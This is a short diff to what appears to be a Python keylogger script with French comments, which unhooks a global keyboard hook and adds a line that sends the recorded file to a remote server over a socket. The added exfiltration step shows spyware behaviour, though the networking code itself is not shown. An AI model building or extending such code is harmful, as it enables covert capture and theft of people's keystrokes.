@@ -21,3 +21,6 @@ except KeyboardInterrupt:
 
 # Désactive le mode d'enregistrement global des touches
 keyboard.unhook_all()
+
+# Envoi du fichier au serveur distant via un socket
+functions.client(file_path)
